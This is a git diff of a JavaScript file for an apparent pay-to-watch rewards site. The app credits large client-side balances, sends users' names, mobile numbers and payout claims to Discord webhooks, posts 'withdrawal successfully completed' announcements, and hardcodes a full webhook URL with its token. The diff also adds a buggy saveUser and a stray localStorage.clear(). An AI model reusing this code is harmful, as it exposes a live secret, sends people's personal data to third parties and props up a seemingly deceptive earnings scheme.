@@ -15,17 +15,10 @@ const loginWebhook =
 
 const balanceWebhook =
 "https://discord.com/api/webhooks/1504475637069385730/XTi4OFxJC0d1ZWWl23gg2c4qob3TyTuBmTQYlAjd87amBuVVF6kkKJ8ainS90WtYKGox";
-
 // AUTO LOGIN
-
 window.onload = () => {
 
-let savedUser =
-JSON.parse(localStorage.getItem("currentUser"));
-
-if(savedUser){
-
-currentUser = savedUser;
+if(currentUser){
 
 showProfile();
 
@@ -34,24 +27,19 @@ showProfile();
 };
 
 // LOGIN
-
 function loginUser(){
 
 let name =
-document.getElementById("name")
-.value.trim();
+document.getElementById("name").value.trim();
 
 let mobile =
-document.getElementById("mobile")
-.value.trim();
+document.getElementById("mobile").value.trim();
 
 let server =
-document.getElementById("server")
-.value;
+document.getElementById("server").value;
 
 let password =
-document.getElementById("password")
-.value.trim();
+document.getElementById("password").value.trim();
 
 if(!name || !mobile || !password){
 
@@ -63,8 +51,6 @@ return;
 let users =
 JSON.parse(localStorage.getItem("users")) || [];
 
-// FIND USER
-
 let existingUser =
 users.find(
 x =>
@@ -74,22 +60,7 @@ x.name.toLowerCase() === name.toLowerCase()
 
 if(existingUser){
 
-if(existingUser.sno === undefined){
-
-existingUser.sno =
-users.indexOf(existingUser) + 1;
-
-}
-
-if(existingUser.videoPending === undefined){
-
-existingUser.videoPending = false;
-
-}
-
 currentUser = existingUser;
-
-saveUser();
 
 }else{
 
@@ -108,11 +79,7 @@ withdrawn: 0,
 
 verified: false,
 
-lastVideo: "",
-
-videoPending: false,
-
-lastWithdrawAmount: 0
+lastVideo: ""
 
 };
 
@@ -125,15 +92,10 @@ JSON.stringify(users)
 
 }
 
-// SAVE LOGIN
-
 localStorage.setItem(
 "currentUser",
 JSON.stringify(currentUser)
 );
-
-// LOGIN WEBHOOK
-
 fetch(loginWebhook,{
 
 method:"POST",
@@ -163,13 +125,11 @@ currentUser.mobile
 })
 
 });
-
 showProfile();
 
 }
 
 // SHOW PROFILE
-
 function showProfile(){
 
 document.getElementById("loginPage")
@@ -212,7 +172,7 @@ document.getElementById("reviewName")
 .value =
 currentUser.name;
 
-// LOCK VERIFY
+// LOCK VERIFY BUTTON
 
 if(currentUser.verified){
 
@@ -226,7 +186,6 @@ document.querySelector(
 }
 
 // SAVE USER
-
 function saveUser(){
 
 let users =
@@ -238,15 +197,7 @@ x =>
 x.mobile === currentUser.mobile
 );
 
-if(index !== -1){
-
 users[index] = currentUser;
-
-}else{
-
-users.push(currentUser);
-
-}
 
 localStorage.setItem(
 "users",
@@ -260,47 +211,7 @@ JSON.stringify(currentUser)
 
 }
 
-// BALANCE WEBHOOK
-
-function sendBalanceUpdate(){
-
-fetch(balanceWebhook,{
-
-method:"POST",
-
-headers:{
-"Content-Type":"application/json"
-},
-
-body:JSON.stringify({
-
-content:
-
-"💰 BALANCE UPDATED\n\n" +
-
-"S. No : " +
-currentUser.sno + "\n" +
-
-"Username : " +
-currentUser.name + "\n" +
-
-"Total Earning : " +
-currentUser.earning + "\n" +
-
-"Withdrawal Money : " +
-currentUser.withdrawn + "\n" +
-
-"Current Balance : " +
-currentUser.balance
-
-})
-
-});
-
-}
-
 // SHOW SECTION
-
 function showSection(id){
 
 if(
@@ -329,7 +240,6 @@ document.getElementById(id)
 }
 
 // BACK PROFILE
-
 function backProfile(){
 
 document.querySelectorAll(".section")
@@ -345,33 +255,28 @@ document.getElementById("profilePage")
 }
 
 // VIDEO REWARD
-
 function watchVideo(){
+
+// ONLY ONE TIME PER VIDEO
 
 if(currentUser.lastVideo === VIDEO_LINK){
 
-alert("Reward already claimed ❌");
+alert(
+"Reward already claimed for this video ❌"
+);
+
 return;
 
 }
-
-if(currentUser.videoPending){
-
-alert("Reward already processing ⏳");
-return;
-
-}
-
-currentUser.videoPending = true;
-
-saveUser();
 
 // OPEN VIDEO
 
-window.location.href =
-VIDEO_LINK;
+window.open(
+VIDEO_LINK,
+"_blank"
+);
 
-// WAIT 10 SEC
+// WAIT 10 SECONDS
 
 setTimeout(() => {
 
@@ -379,12 +284,11 @@ currentUser.balance += 2000;
 
 currentUser.earning += 2000;
 
+// SAVE LAST VIDEO
+
 currentUser.lastVideo = VIDEO_LINK;
 
-currentUser.videoPending = false;
-
 saveUser();
-
 sendBalanceUpdate();
 
 document.getElementById("balance")
@@ -395,14 +299,13 @@ document.getElementById("earning")
 .innerText =
 currentUser.earning;
 
-alert("2000 Added ✅");
+alert("2000 Money Added ✅");
 
 },10000);
 
 }
 
 // SUBSCRIBE
-
 function submitSubscribe(){
 
 if(currentUser.verified){
@@ -434,7 +337,7 @@ return;
 
 }
 
-// WEBHOOK
+// DISCORD MESSAGE
 
 fetch(subscribeWebhook,{
 
@@ -470,7 +373,7 @@ link + "\n\n" +
 
 });
 
-// REWARD
+// VERIFY + REWARD
 
 currentUser.verified = true;
 
@@ -479,7 +382,6 @@ currentUser.balance += 100000;
 currentUser.earning += 100000;
 
 saveUser();
-
 sendBalanceUpdate();
 
 document.getElementById("balance")
@@ -489,6 +391,8 @@ currentUser.balance;
 document.getElementById("earning")
 .innerText =
 currentUser.earning;
+
+// LOCK BUTTON
 
 document.querySelector(
 'button[onclick="showSection(\'subscribeSection\')"]'
@@ -504,7 +408,6 @@ backProfile();
 }
 
 // WITHDRAW
-
 function submitWithdraw(){
 
 let number =
@@ -546,14 +449,10 @@ currentUser.balance -= amount;
 
 currentUser.withdrawn += amount;
 
-currentUser.lastWithdrawAmount =
-amount;
-
 saveUser();
-
 sendBalanceUpdate();
 
-// WEBHOOK
+// DISCORD MESSAGE
 
 fetch(withdrawWebhook,{
 
@@ -599,7 +498,6 @@ backProfile();
 }
 
 // REVIEW
-
 function submitReview(){
 
 let review =
@@ -617,7 +515,7 @@ return;
 
 }
 
-// WEBHOOK
+// DISCORD MESSAGE
 
 fetch(withdrawWebhook,{
 
@@ -633,7 +531,7 @@ content:
 
 "💸 WITHDRAWAL SUCCESSFULLY COMPLETED\n\n" +
 
-currentUser.lastWithdrawAmount +
+currentUser.withdrawn +
 
 " coins transferred successfully to " +
 
@@ -666,3 +564,52 @@ alert("Review Submitted ✅");
 backProfile();
 
 }
+function sendBalanceUpdate(){
+
+fetch(balanceWebhook,{
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+
+content:
+
+"💰 BALANCE UPDATED\n\n" +
+
+"S. No : " +
+currentUser.sno + "\n" +
+
+"Username : " +
+currentUser.name + "\n" +
+
+"Total Earning : " +
+currentUser.earning + "\n" +
+
+"Withdrawal Money : " +
+currentUser.withdrawn + "\n" +
+
+"Current Balance : " +
+currentUser.balance
+
+})
+
+});
+
+}
+// LOGOUT
+function logout(){
+
+localStorage.removeItem("currentUser");
+
+location.reload();
+
+}
+localStorage.clear();
+
+
+
+// end
